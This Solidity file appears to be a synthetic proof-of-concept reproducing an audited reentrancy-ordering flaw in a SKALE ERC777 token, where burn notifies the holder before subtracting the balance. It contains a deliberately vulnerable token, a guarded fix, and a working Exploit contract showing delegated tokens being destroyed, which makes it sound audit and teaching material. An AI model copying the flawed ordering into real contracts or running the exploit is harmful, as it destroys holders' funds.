// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  SKALE LockableERC777 — burn checks the lock, then notifies the holder,
    then subtracts the balance (ConsenSys Diligence, Jan 2020, finding 13843).

    SYNTHETIC, cheatcode-free. The unlocked check runs while delegated is 0.
    tokensToSend delegates the full balance. The burn then still subtracts
    that amount, so delegated tokens are destroyed.

    The victim balance falls by N. The guarded token shares one lock between
    burn and delegate, so the callback cannot delegate and the burn reverts.
    The victim balance stays N. */

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
}

interface IERC777Sender {
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface ISkaleToken {
    function mint(address to, uint256 amount) external;
    function registerSender(address holder, address implementer) external;
    function burn(uint256 amount, bytes calldata data) external;
    function delegate(address holder, uint256 amount) external;
    function balanceOf(address holder) external view returns (uint256);
    function delegatedOf(address holder) external view returns (uint256);
}

contract SkaleToken is ISkaleToken {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;
    mapping(address => uint256) internal _delegated;
    mapping(address => address) internal _senderImplementer;
    uint256 internal _totalSupply;

    function mint(address to, uint256 amount) external {
        _balances[to] = _balances[to].add(amount);
        _totalSupply = _totalSupply.add(amount);
    }

    function registerSender(address holder, address implementer) external {
        _senderImplementer[holder] = implementer;
    }

    function balanceOf(address holder) public view returns (uint256) {
        return _balances[holder];
    }

    function delegatedOf(address holder) public view returns (uint256) {
        return _delegated[holder];
    }

    function delegate(address holder, uint256 amount) public virtual {
        _delegated[holder] = _delegated[holder].add(amount);
    }

    function burn(uint256 amount, bytes calldata data) external virtual {
        _burn(msg.sender, msg.sender, amount, data, "");
    }

    function _getAndUpdateLockedAmount(address holder) internal view returns (uint256) {
        return _delegated[holder];
    }

    function _burn(address operator, address from, uint256 amount, bytes memory data, bytes memory operatorData)
        internal
    {
        require(from != address(0), "ERC777: burn from the zero address");

        uint256 locked = _getAndUpdateLockedAmount(from);
        if (locked > 0) {
            require(_balances[from] >= locked.add(amount), "Token should be unlocked for burning");
        }

        _callTokensToSend(operator, from, address(0), amount, data, operatorData);

        // Update state variables
        _totalSupply = _totalSupply.sub(amount);
        this.writeBurnedBalance(from, amount);
    }

    function writeBurnedBalance(address from, uint256 amount) external {
        require(msg.sender == address(this), "only self");
        // @> VULN: the balance is reduced after tokensToSend, so tokens delegated in that callback are still burned.
        uint256 nextBalance = _balances[from] - amount;
        _balances[from] = nextBalance;
        // FIX: notify the holder before the unlocked check, or refuse delegate while burn is open.
    }

    function _callTokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData
    ) internal {
        address implementer = _senderImplementer[from];
        if (implementer != address(0)) {
            IERC777Sender(implementer).tokensToSend(operator, from, to, amount, userData, operatorData);
        }
    }
}

contract SkaleTokenGuarded is SkaleToken {
    uint256 private _status = 1;

    modifier nonReentrant() {
        require(_status == 1, "reentry");
        _status = 2;
        _;
        _status = 1;
    }

    function delegate(address holder, uint256 amount) public override nonReentrant {
        super.delegate(holder, amount);
    }

    function burn(uint256 amount, bytes calldata data) external override nonReentrant {
        _burn(msg.sender, msg.sender, amount, data, "");
    }
}

contract Victim is IERC777Sender {
    ISkaleToken public token;
    uint256 public delegatedInCallback;

    constructor(ISkaleToken _token) {
        token = _token;
    }

    function burnAll() external {
        token.burn(token.balanceOf(address(this)), "");
    }

    function tokensToSend(address, address from, address, uint256 amount, bytes calldata, bytes calldata) external {
        token.delegate(from, amount);
        delegatedInCallback = token.delegatedOf(from);
    }
}

contract Exploit {
    uint256 public constant N = 100 ether;

    SkaleToken public token;
    Victim public victim;
    uint256 public balanceBefore;
    uint256 public balanceAfter;
    uint256 public dropped;
    uint256 public stillDelegated;

    constructor() {
        token = new SkaleToken();
        victim = new Victim(token);
    }

    function run() external {
        token.mint(address(victim), N);
        token.registerSender(address(victim), address(victim));
        balanceBefore = token.balanceOf(address(victim));
        victim.burnAll();
        balanceAfter = token.balanceOf(address(victim));
        stillDelegated = token.delegatedOf(address(victim));
        dropped = balanceBefore - balanceAfter;
        require(balanceBefore == N, "victim did not start with N");
        require(victim.delegatedInCallback() == N, "callback did not delegate N");
        require(balanceAfter == 0, "victim balance was not burned");
        require(stillDelegated == N, "delegated record was cleared");
        require(dropped == N, "harm");
    }
}
